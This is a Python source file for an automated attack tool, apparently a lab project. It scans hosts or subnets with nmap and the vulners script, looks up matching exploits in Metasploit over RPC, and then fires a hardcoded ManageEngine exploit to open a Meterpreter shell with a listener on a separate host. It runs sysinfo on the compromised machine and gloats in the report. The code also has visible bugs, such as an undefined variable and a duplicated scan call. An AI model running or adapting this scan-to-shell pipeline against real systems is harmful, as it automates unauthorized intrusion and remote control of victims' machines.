import argparse
import os
import sys
import nmap
import json
import xmltodict
import xml.etree.ElementTree as ET
from pymetasploit3.msfrpc import *
import time
from automated_exploits import exploits
import utils

client = MsfRpcClient("password")
cid = client.consoles.console().cid

# Building timestamped filename
date_and_time = time.strftime("%m") + time.strftime("%d") + time.strftime("%y") + '_' + time.strftime("%H") + time.strftime("%M") + time.strftime("%S")
filename = 'traftscan_' + date_and_time
spacing4 = "    "
spacing8 = "        "

# Creating global file for the report in local directory with headers
report = open(filename + '.txt',"w+")
report.write("\t---------- TRAFT SCAN REPORT ----------\n")
report.write("\n" + time.strftime("%c") + "\n\n")

def query_metasploit(command):
    global cid
    global client
    client.consoles.console(cid).write(command)
    out = client.consoles.console(cid).read()['data']
    out = client.consoles.console(cid).read()

def target_nmap_scan(target):

    report.write("*****     Results for " + target + " *****\n\n")

    results_found = False
    nm = nmap.PortScanner()
    nm.scan(target, arguments='-sV --open --host-timeout 2m --script=vulners.nse')
    nmap_output = nm.get_nmap_last_output()

    root = ET.fromstring(nmap_output)
    for item in root.findall(".//script"):
        if item[0].attrib:
            vulners_search_results = (item[0].text).split()
            if any('CVE' in string for string in vulners_search_results):
                print("CVEs found for " + item[0].attrib['key'] + ":")
                results_found = True

                msf_input_list = []
                for string in vulners_search_results:
                    msf_input_list.append(string[4:])
                    print("    " + string)

                report.write("Service: " + item[0].attrib['key'] + "\n")
                report.write(spacing4 + "CVEs: \n")

                for elem in msf_input_list:
                    report.write(spacing8 + "CVE-" + elem + "\n")


                print("\nChecking MetaSploit for available exploits...\n")

                report.write(spacing4 + "Exploits: \n")

                for cve in msf_input_list:
                    c = client.consoles.console(cid).write("search cve:" + cve)
                    out = client.consoles.console(cid).read()['data']
                    #print("111122233333 " + out)
                    timeout = 180
                    counter = 0
                    while counter < timeout:
                        out += client.consoles.console(cid).read()['data']
                        if len(out) > 0:
                            break
                        time.sleep(1)
                        counter += 1
                    if len(out) > 1:
                        #print(out)
                        idx1 = out.find("exploit")
                        idx2 = out.find(" ", idx1)

                        #print(out[idx1:idx2])
                        report.write(spacing8 + out[idx1:idx2] +"\n")
                        #print("******")


    return(results_found)

def subnet_nmap_scan(target):
    nm = nmap.PortScanner()
    nm.scan(target, arguments='-sn')
    nmap_output = nm.get_nmap_last_output()
    nmap_dict = xmltodict.parse(nmap_output)
    subnet_hosts = []
    for result in nmap_dict['nmaprun']['host']:
        if isinstance(result['address'], list):
            subnet_hosts.append(result['address'][0]['@addr'])
        else:
            subnet_hosts.append(result['address']['@addr'])
    return subnet_hosts

def main():
    global cid
    global client
    client.consoles.console(cid).write("db_status")
    print("""

       ______   ______     ______     ______   ______
      /\__  _\ /\  == \   /\  __ \   /\  ___\ /\__  _\
      \/_/\ \/ \ \  __<   \ \  __ \  \ \  __\ \/_/\ \/
         \ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\      \ \_\
          \/_/   \/_/ /_/   \/_/\/_/   \/_/       \/_/

         """)

    parser = argparse.ArgumentParser(description='Tool for host discovery and vulnerability scanning.')
    parser.add_argument("-s", "--subnet", action="store", dest='subnet', help="range of IP addresses")
    parser.add_argument("-t", "--target", action="store", dest='target', help="target IP address")
    parser.add_argument("-s3", "--s3_bucket", default="",
                      help = "The s3 bucket for the report.")

    args = parser.parse_args()

    if args.subnet == None and args.target == None:
        print('No inputs provided, please use -h for usage information.')
    elif args.subnet != None and args.target != None:
        print('Too many inputs provided, please use -h for usage information.')
    elif args.subnet != None:
        print('Running Subnet Scan...\n')

        report.write("Performing SUBNET SCAN on " + args.subnet + "\n")

        hosts = subnet_nmap_scan(args.subnet)
        print('Found the following hosts: ' + str(hosts) + "\n")

        report.write("Live hosts on SUBNET: " + str(hosts) + "\n\n")

        for host in hosts:
            print('Running Target Scan on host ' + str(host) + '...\n')
            target_nmap_scan(host)
            scan_result = target_nmap_scan(host)
            if not scan_result:
                print('No vulnerabilities found.\n')
                print()
            else:
                # run the exploits returned by scan_results.
                # one proof of concept exploit is currently supported.
                # takes some domain knowledge, research and manual testing to write this.

                #TODO: create a dictionary
                # {exploit -> supported_exploit_method_name}
                # {'exploit/windows/http/manageengine_connectionid_write': manageengine_connectionid_write}
                meterpreter = exploits.manageengine_connectionid_write(rhosts="172.28.128.3",
                                                rport="8022",
                                                lhosts="172.28.128.1"
                                                )
                if meterpreter:
                    report.write("GOT SHELL ACCESS! Your target is done for muahahaha")
                    report.write("Running `sysinfo`: ")
                    report.write(meterpreter.run_with_output('sysinfo'))
    elif args.target != None:
        print('Running Target Scan on host ' + str(args.target) + '...\n')

        report.write("Performing TARGET SCAN on " + args.target + "\n\n")

        scan_result = target_nmap_scan(args.target)
        if not scan_result:
            print('No vulnerabilities found.\n')
        else:
            # run the exploits returned by scan_results.
            # one proof of concept exploit is currently supported.
            # takes some domain knowledge, research and manual testing to write this.
            meterpreter = exploits.manageengine_connectionid_write(rhosts="172.28.128.3",
                                            rport="8022",
                                            lhosts="172.28.128.1"
                                            )
            if meterpreter:
                report.write("GOT SHELL ACCESS! Your target is done for muahahaha")
                report.write("Running `sysinfo`: ")
                report.write(meterpreter.run_with_output('sysinfo'))

    report.close()
    if s3!="":
        utils.save_to_s3(filename+".txt", "Traft_Report.txt")
        os.remove(filename + ".txt")


if __name__ == '__main__':
    # Ensures program runs with Python 3
    if sys.version_info[0] < 3:
        raise Exception('Must be using Python 3')

    # TODO: Maybe implement a check for python-nmap

    main()

    report.close()
